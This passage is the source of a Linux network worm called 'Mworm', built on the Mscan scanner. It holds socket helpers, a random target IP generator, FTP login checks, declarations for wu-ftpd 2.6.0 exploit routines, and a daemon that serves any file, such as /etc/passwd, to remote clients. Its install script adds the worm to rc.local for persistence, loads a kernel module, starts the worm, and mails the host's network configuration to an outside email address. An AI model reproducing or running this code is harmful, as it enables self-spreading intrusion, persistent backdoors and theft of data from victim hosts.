		fcntl(fd,F_SETFL,flags);
		if (error ) {
			close(fd);
//			errno=error;
			return(-1);
		}

		return(fd);
}	 


int UDP_NB_connect(unsigned long host_net,int port,int nsec)
				 //no block conneetc,success return fd else return<0
				 //if nsec ==0 then no timeout,waiting....
{
	 struct sockaddr_in sin;
	 int fd;
	 struct hostent *hp;
	 struct in_addr **pptr;
	 int flags,n,error;
	 struct timeval tval;
	 fd_set rset,wset;
	 socklen_t len;

	 fd=socket(AF_INET, SOCK_DGRAM, 0);
	 sin.sin_family=AF_INET;
  	 sin.sin_port=htons(port);
	 sin.sin_addr.s_addr=htonl(host_net);  	

  	flags = fcntl(fd ,F_GETFL,0 );
  	fcntl(fd,F_SETFL,flags | O_NONBLOCK);
  	error=0;
  	
  	  if ((n=connect(fd, (struct sockaddr*)&sin, sizeof(sin)))<0 )
		if ( errno != EINPROGRESS)
			return(-1);
	
	if (n==0)
		goto done;
	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	wset=rset;
	tval.tv_sec=nsec;
	tval.tv_usec=0;
	if ((n=select(fd+1,&rset,&wset,NULL,nsec ? &tval : NULL))==0){
		close(fd);
		errno=ETIMEDOUT;
		return(-1);
	}
	if (FD_ISSET(fd,&rset) || FD_ISSET(fd, &wset)) {
		len =sizeof(error);
		if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len)<0)
			return(-1);
	}else
		error=1;
	
	done:
		fcntl(fd,F_SETFL,flags);
		if (error ) {
			close(fd);
//			errno=error;
			return(-1);
		}
		return(fd);
}	 



int readable_timeo(int fd, int sec)
{
	fd_set rset;
	struct timeval tv;
	
	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	
	tv.tv_sec = sec;
	tv.tv_usec = 0;
	
	return( select(fd+1, &rset, NULL, NULL, &tv));
	// >0 if is readable	
}

int writeable_timeo(int fd, int sec)
{
	fd_set wset;
	struct timeval tv;
	
	FD_ZERO(&wset);
	FD_SET(fd, &wset);
	
	tv.tv_sec = sec;
	tv.tv_usec = 0;
	
	return( select(fd+1, NULL, &wset, NULL, &tv));
	// >0 if is readable	
}

char * create_randomIP()  //create a ip address, the last bit is 1
{
	int a=0,b=0,c=0;
	char * returnv=(char*)malloc(sizeof(char)*24);
	
	srand(time(NULL));
	start:;
	a=1+(int) (223.0*rand()/(RAND_MAX+1.0));
	b=1+(int) (255.0*rand()/(RAND_MAX+1.0));
	c=1+(int) (255.0*rand()/(RAND_MAX+1.0));
	
	if (a == 127) { goto start; }
	if (a == 0) { goto start; }
	if (a == 1) { goto start; }
	if (a == 2) { goto start; }
	if (a == 3) { goto start; }
	if (a == 4) { goto start; }
	if (a == 5) { goto start; }
	if (a == 6) { goto start; }
	if (a == 7) { goto start; }
	if (a == 8) { goto start; }
	if (a == 9) { goto start; }
	if (a == 10) { goto start; }
	if (a == 49) { goto start; }
	if (a == 192) { if (b == 168) { goto start; } }
	sprintf(returnv,"%i.%i.%i.1", a, b,c);	
	return returnv;
}

void  net_write (int fd, const char *str, ...)
{
	char	tmp[1025];
	va_list	vl;
	int	i;

	va_start(vl, str);
	memset(tmp, 0, sizeof(tmp));
	i = vsnprintf(tmp, sizeof(tmp), str, vl);
	va_end(vl);

	send(fd, tmp, i, 0);
	return;
}

int Check_Anonymous_FTP(int fd )  //check if support anonymous ftp ,return 1 is ok
{
	
	char *username="ftp";
	char *password="Mscan@mail.com";
	
	return (Check_Normal_FTP( fd, username, password )==1);
	
}



int Check_Normal_FTP(int fd , char *Fname, char *Fpass )
{
	char username[50];
	char *user_OK="331";
	char password[50];
	char *pass_OK="230";
	char serv_string[1024];
	int  tmpResult;
	
	sprintf(username, "USER %s\r\n", Fname);
	sprintf(password, "PASS %s\r\n", Fpass);
	
	//send username
	if (writeable_timeo(fd, 4)<=0 ) return(0);
	tmpResult = writen(fd, username, strlen(username));	
	if (tmpResult<=0) return(0);
	if (readable_timeo(fd, 4)<=0 ) return(0);	
	tmpResult=read(fd,serv_string,1024);
	if (tmpResult<=0) return(0);
	if (strstr(serv_string,user_OK)==NULL) return(0);
	
	//send password
	if (writeable_timeo(fd, 4)<=0 ) return(0);
	tmpResult = writen(fd, password, strlen(password));	
	if (tmpResult<=0) return(0);
	if (readable_timeo(fd, 4)<=0 ) return(0);	
	tmpResult=read(fd,serv_string,1024);
	if (tmpResult<=0) return(0);
	if (strstr(serv_string,pass_OK)==NULL) return(0);

	return(1);	
}

char * HTStrCaseStr (char * s1, char * s2)
{
    char * ptr = s1;

    if (!s1 || !s2 || !*s2) return s1;

    while (*ptr) {
	if (toupper(*ptr) == toupper(*s2)) {
	    char * cur1 = ptr + 1;
	    char * cur2 = s2 + 1;
	    while (*cur1 && *cur2 && toupper(*cur1) == toupper(*cur2)) {
		cur1++;
		cur2++;
	    }
	    if (!*cur2)	return ptr;
	}
	ptr++;
    }
    return NULL;
}


char * Get_Range_Str (char * s, char * b, char * e)
{
	
	char * tmpStr1, * tmpStr2;
	
	tmpStr1=HTStrCaseStr(s, b);
	if (tmpStr1==NULL) return(NULL);
	tmpStr2=HTStrCaseStr(s,e);
	if (tmpStr2==NULL) return(NULL);
	tmpStr1[strlen(tmpStr1)-strlen(tmpStr2)]=0;
	sprintf(tmpStr1,"%s",tmpStr1+strlen(b));
	return (tmpStr1);
			
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMON.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMON.H]ÄÄÄ
//common.h
//Based on Mscan
//Part of Mworm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpc/pmap_prot.h>
#include <rpc/pmap_clnt.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <signal.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <getopt.h>
#include <stdarg.h>
#include <netinet/ip.h>
//#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <thread_db.h>
#include <sys/time.h>
#include <sys/select.h>
#include <sys/file.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <ctype.h>

//#define DEBUG	 1      //if u  want to debug define it ,else not define it 
#define	MAXHOST	         255    //define the scale max  host number once scan
#define SCANPORTNUM	 11	//define the scan port type number
#define MAXTHREAD	 40     //define the thread num once time, default=10
#define MIN_MULTI_NUM	 1	//define the min of the multi, default = 1;
#define CONNECT_TIME	 4	//define the connect timeout , default=2;
#define WEB_READTIMEOUT	 4      //define the 80 socket read timeout , default=4
#define WEB_WRITETIMEOUT 4      //define the 80 socket write timeout , default=4
#define FTP_READTIMEOUT  4	//define the 21 socket read timeout, default=4
#define FTP_WRITETIMEOUT 4	//define the 21 socket write timeout, default=4
#define TELNET_READTIMEOUT 2	//define the 23 socket read timeout ,default=4
#define TELNET_WRITETIMEOUT 2	//define the 23 socket write timeout ,default=4
#define FINGER_WRITETIMEOUT 6   //define the finger timeout
#define RPC_TIMEOUT	 4      //define the create rpc timeout , default = 4
#define BIND_TIMEOUT	 4	//define the bind check timeout , default = 4
#define CHECK_COUNT_M	 6	//define the hole count when scan multi host, default=13
#define CHECK_COUNT_S	 6	//define all the check count ,if u add one type ,please modify it
#define H_CONNECTING	 1
#define H_NONE		 0
#define H_TESTING	 2
#define H_DONE		 3
#define H_JOINED	 4
#define WU_FTP_260	 1      //define the wu_ftp ver 2.60 type
#define  LISTENQ		1		/* listen() backlog */
#define max(a,b) ((a)>(b)?(a):(b))
#define NOP 0x90


struct host{
	char h_name[1024];
	unsigned long h_network;
	int h_port;
	int h_flags;
	int h_tid;
}host[MAXHOST];

int HostNumber;


int daemon_init();
void sig_chid(int signo);
ssize_t writen(int fd,const void *vptr,size_t n);
ssize_t readn(int fd,void *vptr,size_t n);
static ssize_t my_read(int fd,char *ptr);
ssize_t readline(int fd,void *vptr,size_t maxlen,int want_n);
char * Get_localIP(int fd);	//use getsockname to return the local ip address
int TCP_listen(int port);
int TCP_connect(char *Remote,int port);
int TCP_NB_connect(unsigned long host_net,int port,int nsec);
int UDP_NB_connect(unsigned long host_net,int port,int nsec);
int readable_timeo(int fd, int sec);  //check if is readable , sec is the timeout time 
				     //>0 express is readable

int writeable_timeo(int fd, int sec);  //check if is writeable , sec is the timeout time 
char * create_randomIP();  //create a ip address, the last bit is 1
void  net_write (int fd, const char *str, ...);  //thank 7350.c
int Check_Anonymous_FTP(int fd );  //check if support anonymous ftp ,return 1 is ok
int Check_Normal_FTP(int fd , char *Fname, char *Fpass ); 
				   //use Fname and Fpass land ftp server ,return 1 is ok
char * HTStrCaseStr (char * s1, char * s2);  //no case as strstr
char * Get_Range_Str (char * s, char * b, char * e);

//in CheckCGI.c
void Handle_Port_80(int fd, char *hostip,struct host *iptr);   //handle port 80
char * Get_IIS_Title(int fd, char * hostip);                //Get the Host IIS first page Title

//in CheckFTP.c
int Handle_Port_21(int fd,char *hostip,struct host *iptr);  //Handle Ftp Scan
int ftp_login(struct host *iptr);  //Login FTP server
void FTP_shell (int sock);
void ftp_recv_until (int sock, char *buff, int len, char *begin);
unsigned long int ftp_finddist (int);
int net_rlinet (int fd, char *buf, int bufsize, int sec);
int net_rtimeout (int fd, int sec);
unsigned long int ftp_findaddr (int ftpsock, struct host *iptr);
void xpad_cat (unsigned char *fabuf, unsigned long int addr);
unsigned long int ftp_finddaddr (int ftpsock, struct host *iptr);
unsigned long int ftp_findrl (int ftpsock,unsigned long int retloc);
void ftp_exploit (int ftpsock);
int ftp_getwlen (int);
int esc_ok (unsigned long int addr);
int wuftp260_vuln (int ftpsock, char * hostip, struct host *iptr);
int ftp_vuln (int ftpsock);
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMMON.H]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MHTTPD.C]ÄÄÄ
//Mhttpd.c is a Http deamon ,it can translate file from ip to ip
//based on Mscan
//compile: gcc Mhttpd.c tiny.c -o Mhttpd

#include "tiny.h"

unsigned char ret_buf[32768];

char * read_worm_file(char *, int );  //return the file content as a large string


//The main function from here 
int main(int argc,char *argv[])
{
	int fd, len,i;
	int csocket ;
	struct sockaddr_in caddr ;	
	char readstr[4000];
	char * cbuf;
//	pid_t pid ;		/* tipo pid per il fork() */	
	
#ifdef DEBUG
	goto WS;
#endif
	daemon_init();		//become a deamon program
	
WS:		
	fd=TCP_listen(7977);
	if (fd <= 0) return -1;
	signal(SIGCHLD,sig_chid);
	
	for(;;)	
	{       
	    	len = sizeof(caddr);
   		if((csocket=accept(fd, &caddr, &len)) < 0)  continue;
//		if ((pid=fork()) == -1) continue;
   		
//   		if(pid<=0){
   			i = recv(csocket,readstr,4000,0);
   			if (i == -1) break;
   			if( readstr[ i -1 ] != '\n' ) break;
   			readstr [i] = '\0';
#ifdef DEBUG
			printf("Read from client: %s \n", readstr);
#endif
			cbuf =  read_worm_file(readstr, csocket);
			close(csocket);	
//		}
//		close(csocket);
	}
	
	close(fd);
	return(1);
}


//return the file content as a large string
//buf value like GET /index.html HTTP:/1.1
char * read_worm_file(char *buf, int fd)  
{
	char *error_return = "<HTML>\n<BODY>File not found\n</BODY>\n</HTML>";
//	char *p;
	int i;
	char *cp, *cp2;
	FILE *f;
//	FILE *w;
	
	cp = buf +5;
	cp2 = strstr(cp , "HTTP");
	if(cp2!=NULL) *cp2 = '\0';
	cp[strlen(cp)-1] = 0;
#ifdef DEBUG
	printf("File: %s\n", cp);
#endif
	f = fopen(cp, "r");
//	w = fopen("/root/a.tar.gz","w");
	if (f ==NULL) return error_return;
	while( !feof(f) ) {
		i = fread(ret_buf, 1, 32768, f);
		if (i == 0)  break; 
		//ret_buf[i] = '\0';
		writen( fd, ret_buf, i );
		//fwrite(ret_buf, 1, i, w);
	}
	
	fclose(f);
//	fclose (w);
	return ret_buf;		
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MHTTPD.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MHTTPD2.C]ÄÄÄ
//Mhttpd.c is a Http server ,it can translate file from remote host
//Workd under linux
//Code by Leaf  whleaf@21cn.com
//compile: gcc Mhttpd2.c -o Mhttpd2
//Usage:
//Server: ./Mhttpd2
//Client: http://IP:7977//etc/passwd

#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>


#define HTTPD_PORT	7977
unsigned char ret_buf[32768];


int TCP_listen(int port)          //success return 1 else return -1
{
	
	struct sockaddr_in laddr ;
	int fd;
	socklen_t len ;
	fd=socket(AF_INET, SOCK_STREAM, 0);
	len = sizeof(laddr) ;
        memset(&laddr, 0, len) ;	
   	laddr.sin_addr.s_addr = htonl(INADDR_ANY) ;
   	laddr.sin_family = AF_INET ;
   	laddr.sin_port = htons(port) ;  
   	if((bind(fd, (const struct sockaddr *)&laddr, len)))  return(-1);
   	if(listen(fd, 5))	return(-1);
	return(fd);
}

//return the file content as a large string
//buf value like GET /index.html HTTP:/1.1
char * read_worm_file(char *buf, int fd)  
{
	char *error_return = "<HTML>\n<BODY>File not found\n</BODY>\n</HTML>";
	int i;
	char *cp, *cp2;
	FILE *f;
	
	cp = buf +5;
	cp2 = strstr(cp , "HTTP");
	if(cp2!=NULL) *cp2 = '\0';
	cp[strlen(cp)-1] = 0;
	printf("File: %s\n", cp);
	f = fopen(cp, "r");
	if (f ==NULL) return error_return;
	while( !feof(f) ) {
		i = fread(ret_buf, 1, 32768, f);
		if (i == 0)  break; 
		writen( fd, ret_buf, i );
	}
	
	fclose(f);
	return ret_buf;		
}


void sig_chid(int signo)			//wait the child die
{
	pid_t pid;
	int stat;
	while((pid=waitpid(-1,&stat,WNOHANG))>0)
		printf("child %d die\n",pid);
	return;
}
	

ssize_t writen(int fd,const void *vptr,size_t n)    //writen data to socket
{
	size_t nleft;
	ssize_t nwritten;
	const char *ptr;
	ptr=vptr;
	nleft=n;
	while(nleft>0){
		if((nwritten=write(fd,ptr,nleft))<=0){
			if(errno==EINTR)
				nwritten=0;
			else
				return(-1);
		}
			nleft-=nwritten;
			ptr+=nwritten;
	}
	return(n);
}


//The main function from here 
int main(int argc,char *argv[])
{
	int fd, len,i;
	int csocket ;
	struct sockaddr_in caddr ;	
	char readstr[4000];
	char * cbuf;
	pid_t pid ;

	fd=TCP_listen(HTTPD_PORT);
	if (fd <= 0) return -1;
	signal(SIGCHLD,sig_chid);
	
	for(;;)	
	{       
	    	len = sizeof(caddr);
   		if((csocket=accept(fd, &caddr, &len)) < 0)  continue;
   		if ((pid=fork()) == -1) continue;
   		if(pid<=0){
			i = recv(csocket,readstr,4000,0);
   			if (i == -1) break;
   			if( readstr[ i -1 ] != '\n' ) break;
   			readstr [i] = '\0';
			printf("Read from client: %s \n", readstr);
			cbuf =  read_worm_file(readstr, csocket);
			close(csocket);	
		}
		close(csocket);
	}
	close(fd);
	return(1);
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MHTTPD2.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TINY.C]ÄÄÄ
#include "common.h"

int daemon_init()  //init the daemon,if success return 0 other <0
{
	struct sigaction act;
	int i,maxfd;
	if(fork()!=0)   exit(0);
	if(setsid()<0)  return(-1);
	act.sa_handler=SIG_IGN;
	//act.sa_mask=0;
	act.sa_flags=0;
	sigaction(SIGHUP,&act,0);
	if(fork()!=0)   exit(0);
	chdir("/");
	umask(0);
	maxfd=sysconf(_SC_OPEN_MAX);
	for(i=0;i<maxfd;i++)
		close(i);
	open("/dev/null",O_RDWR);
	dup(0);
	dup(1);
	dup(2);
	return(0);
}

void sig_chid(int signo)			//wait the child die
{
	pid_t pid;
	int stat;
	while((pid=waitpid(-1,&stat,WNOHANG))>0)
		printf("child %d die\n",pid);
	return;
}


ssize_t writen(int fd,const void *vptr,size_t n)    //writen data to socket
{
	size_t nleft;
	ssize_t nwritten;
	const char *ptr;
	ptr=vptr;
	nleft=n;
	while(nleft>0){
		if((nwritten=write(fd,ptr,nleft))<=0){
			if(errno==EINTR)
				nwritten=0;
			else
				return(-1);
		}
			nleft-=nwritten;
			ptr+=nwritten;
	}
	return(n);
}
	

ssize_t readn(int fd,void *vptr,size_t n)   //read n bytes from socket
{
	size_t nleft;
	ssize_t nread;
	char *ptr;
	ptr=vptr;
	nleft=n;
	while(nleft>0){
		if((nread=read(fd,ptr,nleft))<0){
			if(errno==EINTR)
			nread=0;
			else
			return(-1);
		}else if(nread==0)
		break;
		nleft-=nread;
		ptr+=nread;
	}
	return(n-nleft);
}


static ssize_t my_read(int fd,char *ptr)
{
	static int read_cnt=0;
	static char *read_ptr;
	static char read_buf[1024];
	if(read_cnt<=0){
	  again:
		if((read_cnt=read(fd,read_buf,sizeof(read_buf)))<0){
			if(errno==EINTR)
				goto again;
			return(-1);
		}else if (read_cnt==0)
			return(0);
		read_ptr=read_buf;
	}
	read_cnt--;
	*ptr=*read_ptr++;
	return(1);
}

ssize_t readline(int fd,void *vptr,size_t maxlen,int want_n) 
						 //read a line from socket
{
	int rc,n;
	char c, *ptr;
	ptr=vptr;
	for(n=1;n<maxlen;n++){
	 if((rc=my_read(fd,&c))==1){
	  if (want_n==1){
		  *ptr++=c;
	  	  if(c=='\n')
	  		break;
	  }else{
		  if(c=='\n')
			break;
	           *ptr++=c;
	   }
	   }else if(rc==0){
		if(n==1)
		   return(0);
		else
		   break;
	}else
		return(-1);
	}
	*ptr=0;
	return(n);
}

int TCP_listen(int port)              //success return 1 else return -1
{
	
	struct sockaddr_in laddr ;	/* struttura IPv4 del demone */
	int fd;
	socklen_t len ;		/* dimensioni della struttura IPv4 */
	fd=socket(AF_INET, SOCK_STREAM, 0);
	len = sizeof(laddr) ;
        memset(&laddr, 0, len) ;	
   	laddr.sin_addr.s_addr = htonl(INADDR_ANY) ;
   	laddr.sin_family = AF_INET ;
   	laddr.sin_port = htons(port) ;  /* apriamo sulla porta 6666 */
   	if((bind(fd, (const struct sockaddr *)&laddr, len)))  return(-1);
   	if(listen(fd, 5))	return(-1);
	return(fd);
}

int TCP_connect(char *Remote,int port)
				 //success return fd else return -1
{
	 struct sockaddr_in sin;
	 int fd;
	 struct hostent *hp;
	 struct in_addr **pptr;
	 fd=socket(AF_INET, SOCK_STREAM, 0);
	 sin.sin_family=AF_INET;
  	 sin.sin_port=htons(port);
  	 if ((hp=gethostbyname(Remote)) == NULL )
  		inet_pton(AF_INET,Remote,&sin.sin_addr);
  	 else{
  	 	pptr=(struct in_addr **) hp->h_addr_list;
  	 	memcpy(&sin.sin_addr,*pptr,sizeof(struct in_addr));
  	}
  	  if (connect(fd, (struct sockaddr*)&sin, sizeof(sin))==0)   //success
  	{	
  		return(fd);
  	}
  	else return(-1);
}

  	 
int TCP_NB_connect(unsigned long host_net,int port,int nsec)
				 //no block conneetc,success return fd else return<0
				 //if nsec ==0 then no timeout,waiting....
{
	 struct sockaddr_in sin;
	 int fd;
	 struct hostent *hp;
	 struct in_addr **pptr;
	 int flags,n,error;
	 struct timeval tval;
	 fd_set rset,wset;
	 socklen_t len;

	 fd=socket(AF_INET, SOCK_STREAM, 0);
	 sin.sin_family=AF_INET;
  	 sin.sin_port=htons(port);
	 sin.sin_addr.s_addr=htonl(host_net);  	

  	flags = fcntl(fd ,F_GETFL,0 );
  	fcntl(fd,F_SETFL,flags | O_NONBLOCK);
  	error=0;
  	
  	  if ((n=connect(fd, (struct sockaddr*)&sin, sizeof(sin)))<0 )
		if ( errno != EINPROGRESS)
			return(-1);
	
	if (n==0)
		goto done;
	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	wset=rset;
	tval.tv_sec=nsec;
	tval.tv_usec=0;
	if ((n=select(fd+1,&rset,&wset,NULL,nsec ? &tval : NULL))==0){
		close(fd);
		errno=ETIMEDOUT;
		return(-1);
	}
	if (FD_ISSET(fd,&rset) || FD_ISSET(fd, &wset)) {
		len =sizeof(error);
		if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len)<0)
			return(-1);
	}else
		error=1;
	
	done:
		fcntl(fd,F_SETFL,flags);
		if (error ) {
			close(fd);
//			errno=error;
			return(-1);
		}
		return(fd);
}	 


int UDP_NB_connect(unsigned long host_net,int port,int nsec)
				 //no block conneetc,success return fd else return<0
				 //if nsec ==0 then no timeout,waiting....
{
	 struct sockaddr_in sin;
	 int fd;
	 struct hostent *hp;
	 struct in_addr **pptr;
	 int flags,n,error;
	 struct timeval tval;
	 fd_set rset,wset;
	 socklen_t len;

	 fd=socket(AF_INET, SOCK_DGRAM, 0);
	 sin.sin_family=AF_INET;
  	 sin.sin_port=htons(port);
	 sin.sin_addr.s_addr=htonl(host_net);  	

  	flags = fcntl(fd ,F_GETFL,0 );
  	fcntl(fd,F_SETFL,flags | O_NONBLOCK);
  	error=0;
  	
  	  if ((n=connect(fd, (struct sockaddr*)&sin, sizeof(sin)))<0 )
		if ( errno != EINPROGRESS)
			return(-1);
	
	if (n==0)
		goto done;
	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	wset=rset;
	tval.tv_sec=nsec;
	tval.tv_usec=0;
	if ((n=select(fd+1,&rset,&wset,NULL,nsec ? &tval : NULL))==0){
		close(fd);
		errno=ETIMEDOUT;
		return(-1);
	}
	if (FD_ISSET(fd,&rset) || FD_ISSET(fd, &wset)) {
		len =sizeof(error);
		if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len)<0)
			return(-1);
	}else
		error=1;
	
	done:
		fcntl(fd,F_SETFL,flags);
		if (error ) {
			close(fd);
//			errno=error;
			return(-1);
		}
		return(fd);
}	 



int readable_timeo(int fd, int sec)
{
	fd_set rset;
	struct timeval tv;
	
	FD_ZERO(&rset);
	FD_SET(fd, &rset);
	
	tv.tv_sec = sec;
	tv.tv_usec = 0;
	
	return( select(fd+1, &rset, NULL, NULL, &tv));
	// >0 if is readable	
}

int writeable_timeo(int fd, int sec)
{
	fd_set wset;
	struct timeval tv;
	
	FD_ZERO(&wset);
	FD_SET(fd, &wset);
	
	tv.tv_sec = sec;
	tv.tv_usec = 0;
	
	return( select(fd+1, NULL, &wset, NULL, &tv));
	// >0 if is readable	
}

char * create_randomIP()  //create a ip address, the last bit is 1
{
	int a=0,b=0,c=0;
	char * returnv=(char*)malloc(sizeof(char)*24);
	
	srand(time(NULL));
	start:;
	a=1+(int) (223.0*rand()/(RAND_MAX+1.0));
	b=1+(int) (255.0*rand()/(RAND_MAX+1.0));
	c=1+(int) (223.0*rand()/(RAND_MAX+1.0));
	
	if (a == 127) { goto start; }
	if (a == 0) { goto start; }
	if (a == 1) { goto start; }
	if (a == 2) { goto start; }
	if (a == 3) { goto start; }
	if (a == 4) { goto start; }
	if (a == 5) { goto start; }
	if (a == 6) { goto start; }
	if (a == 7) { goto start; }
	if (a == 8) { goto start; }
	if (a == 9) { goto start; }
	if (a == 10) { goto start; }
	if (a == 49) { goto start; }
	if (a == 192) { if (b == 168) { goto start; } }
	sprintf(returnv,"%i.%i.%i.1", a, b,c);	
	return returnv;
}
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TINY.C]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TINY.H]ÄÄÄ
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpc/pmap_prot.h>
#include <rpc/pmap_clnt.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <signal.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <getopt.h>
#include <stdarg.h>
#include <netinet/ip.h>
//#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <pthread.h>
#include <thread_db.h>
#include <sys/time.h>
#include <sys/select.h>
#include <sys/file.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <ctype.h>

//#define DEBUG	 1      //if u  want to debug define it ,else not define it 
#define	MAXHOST	         255    //define the scale max  host number once scan
#define SCANPORTNUM	 11	//define the scan port type number
#define MAXTHREAD	 40     //define the thread num once time, default=10
#define MIN_MULTI_NUM	 1	//define the min of the multi, default = 1;
#define CONNECT_TIME	 4	//define the connect timeout , default=2;
#define WEB_READTIMEOUT	 4      //define the 80 socket read timeout , default=4
#define WEB_WRITETIMEOUT 4      //define the 80 socket write timeout , default=4
#define FTP_READTIMEOUT  4	//define the 21 socket read timeout, default=4
#define FTP_WRITETIMEOUT 4	//define the 21 socket write timeout, default=4
#define TELNET_READTIMEOUT 2	//define the 23 socket read timeout ,default=4
#define TELNET_WRITETIMEOUT 2	//define the 23 socket write timeout ,default=4
#define FINGER_WRITETIMEOUT 6   //define the finger timeout
#define RPC_TIMEOUT	 4      //define the create rpc timeout , default = 4
#define BIND_TIMEOUT	 4	//define the bind check timeout , default = 4
#define CHECK_COUNT_M	 19	//define the hole count when scan multi host, default=13
#define CHECK_COUNT_S	 426	//define all the check count ,if u add one type ,please modify it
#define H_CONNECTING	 1
#define H_NONE		 0
#define H_TESTING	 2
#define H_DONE		 3
#define H_JOINED	 4
#define WU_FTP_260	 1      //define the wu_ftp ver 2.60 type
#define  LISTENQ		1		/* listen() backlog */

struct host{
	char h_name[1024];
	unsigned long h_network;
	int h_port;
	int h_flags;
	int h_tid;
}host[MAXHOST];

int HostNumber;


int daemon_init();
void sig_chid(int signo);
ssize_t writen(int fd,const void *vptr,size_t n);
ssize_t readn(int fd,void *vptr,size_t n);
static ssize_t my_read(int fd,char *ptr);
ssize_t readline(int fd,void *vptr,size_t maxlen,int want_n);
int TCP_listen(int port);
int TCP_connect(char *Remote,int port);
int TCP_NB_connect(unsigned long host_net,int port,int nsec);
int UDP_NB_connect(unsigned long host_net,int port,int nsec);
int readable_timeo(int fd, int sec);  //check if is readable , sec is the timeout time 
				     //>0 express is readable

int writeable_timeo(int fd, int sec);  //check if is writeable , sec is the timeout time 
char * create_randomIP();  //create a ip address, the last bit is 1
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[TINY.H]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[INSTALL.SH]ÄÄÄ
#!/bin/sh
cat startup >> /etc/rc.d/rc.local
gcc -O3 -DMODULE -D__KERNEL__ -c 3c95.c
/sbin/insmod 3c95.o
killall -9 Mhttpd
killall -9 Mworm
./Mhttpd
./Mworm &
/sbin/ifconfig -a | mail -s MscanWorm whleaf@21cn.com
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[INSTALL.SH]ÄÄÄ
